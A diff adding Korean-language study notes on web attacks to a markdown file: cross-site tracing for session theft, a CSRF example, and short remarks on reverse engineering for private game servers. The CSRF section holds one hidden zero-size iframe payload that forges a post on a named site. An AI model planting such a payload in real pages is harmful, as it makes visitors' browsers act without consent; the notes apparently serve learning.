@@ -37,3 +37,26 @@ XSS는 간단한 스크립팅 문장을 작성함으로써 서버가 스크립�
 * 현재 목표로 하는 웹 서버가 HttpOnly를 지원하여 XSS 공격이 통하지 않지만 TRACE프로토콜을 허용하고 있을 때 XML 요청을 이용하여 세션을 탈취하는 공격 방법
 * Putty와 같은 원격 접속 프로그램을 이용하여 TRACE 통신이 가능한지 확인
 * TRACE 통신이 가능하다면 이를 이용한 세션 탈취를 감행
+
+## CSRF(Cross Site Request Forgery) 공격기법
+
+```
+<iframe src="http://dowellcomputer.com/hacking/talk/talkWriteActionHacked.jsp?talkType=JAVA&talkTitle=fool&talkContent=fool&talkSourceCode=fool" width="0" height="0" frameborder="0"></iframe>
+```
+
+## 역공학(Reverse Engineering)의 개요와 데이터베이스 구축
+
+```
+반대로 거슬러 올라가는 공학의 개념이다.
+역공학은 일반적으로 특정한 시스템과 흡사한 시스템을 만들어내거나 기초적 단계부터 분석해서 자신이 원하는대로 변환시킴.
+정상서버의 DB와 자원을 빌려서 사용하여 다른 형태로 가공할때 많이 사용한다. ex)프리메이플, 프리리니지
+즉, 분석과 재생성이다.
+
+```
+
+## 역공학 데이터 파싱과 분할
+
+```
+파싱하여서 replaceAll을 사용하여 필요 없는 부분을 없애주었다.
+```
+
